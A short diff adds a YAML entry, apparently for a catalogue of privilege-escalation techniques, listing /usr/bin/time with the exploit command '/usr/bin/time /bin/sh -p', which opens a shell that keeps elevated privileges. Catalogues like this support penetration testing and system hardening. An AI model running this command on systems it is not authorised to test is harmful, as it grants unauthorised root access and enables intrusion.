@@ -1,0 +1,4 @@
+name: time
+binary_path: /usr/bin/time
+exploit_cmds:
+- /usr/bin/time /bin/sh -p
